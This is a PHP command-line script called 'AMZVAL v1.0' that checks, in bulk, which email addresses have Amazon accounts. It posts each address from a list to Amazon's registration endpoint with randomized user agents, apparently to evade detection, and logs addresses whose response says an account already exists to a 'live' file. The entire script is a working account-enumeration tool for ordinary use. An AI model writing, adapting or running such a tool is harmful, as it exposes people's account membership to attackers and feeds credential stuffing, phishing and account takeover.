<?php

/*
 * Mukhlis Akbarrudin
 * 20 June 2019
 * Recode doesn't make you a Coder
 * Don't delete or change anything here
 */

require_once('vendor/autoload.php');
date_default_timezone_set('Asia/Jakarta');
use \Curl\MultiCurl;
$climate = new League\CLImate\CLImate;

// core of the core
function chk ($emailist,$req) {
    $multi_curl = new MultiCurl();
    $multi_curl->setOpt(CURLOPT_ENCODING, '');
    $multi_curl->beforeSend(function ($instance) {
        $instance->setUserAgent(randstr(100));
        $instance->setCookieJar('cookies/cookies.txt');
        $instance->setCookieFile('cookies/cookies.txt');
    });
    $multi_curl->complete(function ($instance) {
        $climate = new League\CLImate\CLImate;
        $respon = $instance->response;
        if(strpos($respon, 'You indicated you are a new customer, but an account already exists with the e-mail') !== false) {
            saveEmail('rezult/live.txt',$instance->eml);
            $climate->out("[+] <light_blue>[AMZVAL v1.0]</light_blue> - <light_yellow>".date("Y-m-d H:i:s")."</light_yellow> - <light_green>LIVE</light_green> => <light_magenta>".$instance->eml."</light_magenta>");
        } else {
            saveEmail('rezult/die.txt',$instance->eml);
            $climate->out("[+] <light_blue>[AMZVAL v1.0]</light_blue> - <light_yellow>".date("Y-m-d H:i:s")."</light_yellow> - <light_red>DEAD</light_red> => <light_magenta>".$instance->eml."</light_magenta>");
        }
    });
    for ($i=0; $i<$req; $i++) {
        $contents = file($emailist, FILE_IGNORE_NEW_LINES);
        $eml = array_shift($contents);       
        $instance = $multi_curl->addPost('https://www.amazon.com/ap/register?openid.assoc_handle=smallparts_amazon&openid.identity=http://specs.openid.net/auth/2.0/identifier_select&openid.ns=http://specs.openid.net/auth/2.0&openid.claimed_id=http://specs.openid.net/auth/2.0/identifier_select&openid.return_to=https://www.smallparts.com/signin&marketPlaceId=A2YBZOQLHY23UT&clientContext=187-1331220-8510307&pageId=authportal_register&openid.mode=checkid_setup&siteState=finalReturnToUrl=https://www.smallparts.com/contactus/187-1331220-8510307?appAction=ContactUsLanding&pf_rd_m=A2LPUKX2E7NPQV&appActionToken=lptkeUQfbhoOU3v4ShyMQLid53Yj3D&ie=UTF8,regist=true', array(
            "email" => $eml
        ));
        $instance->eml = $eml;
        file_put_contents($emailist, implode("\r\n", $contents));
    }
    $multi_curl->start();
}

// just randstring
function randstr ($ln) {
    $char = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charLn = strlen($char);
    $rnd = '';
    for ($i = 0; $i < $ln; $i++) { $rnd .= $char[rand(0, $charLn - 1)]; }
    return $rnd;
}

// save eml to file
function saveEmail ($fileName,$line) {
    $file = fopen($fileName, 'a');
    fwrite($file, $line ."\n");
    fclose($file);
}

// print rez progress
function rezProgress ($emailist,$req,$delay) {
    $climate = new League\CLImate\CLImate;
    $climate->out("[+] Remaining: ".count(file($emailist))." - <light_green>LIVE: ".count(file("rezult/live.txt"))."</light_green> - <light_red>DEAD: ".count(file("rezult/die.txt"))."</light_red> - Ratio: ".$req." req / ".$delay." sec");
}

// -- start output to user --

$climate->out("
<light_yellow>   ___          </light_yellow><light_red> _   __     __</light_red>
<light_yellow>  / _ | __ _  __</light_yellow><light_red>| | / /__ _/ /</light_red>
<light_yellow> / __ |/  ' \/_ /</light_yellow><light_red> |/ / _ `/ /</light_red> 
<light_yellow>/_/ |_/_/_/_//__/</light_yellow><light_red>___/\_,_/_/</light_red>  
                       v1.0");

// clean rez folder
$climate->br();
$clean = $climate->confirm('[+] Clean /rezult ?');
if ($clean->confirmed()) {
    file_put_contents('rezult/live.txt', "");
    file_put_contents('rezult/die.txt', "");
}

// get emailist file
$emailist = $climate->input('[+] Emailist to chk ?')->prompt(); 

// remove duplicate line
$rmDuplicate = $climate->confirm('[+] Remove duplicate line ?');
if ($rmDuplicate->confirmed()) {
    $lines = file($emailist, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $lines = array_map('trim',$lines);
    $lines = array_unique($lines);
    file_put_contents($emailist, implode(PHP_EOL, $lines));
}

// count total email list file
$climate->br();
$climate->out("[+] Total ".count(file($emailist))." emails");
$climate->br();

// get input req and delay
$req = $climate->input('[+] Request ?')->prompt();
$delay = $climate->input('[+] Delay ?')->prompt();
$climate->br();

// do check until emailist 0
while (count(file($emailist)) !== 0 ) {
    chk($emailist,$req);
    rezProgress($emailist,$req,$delay);
    sleep($delay);
}
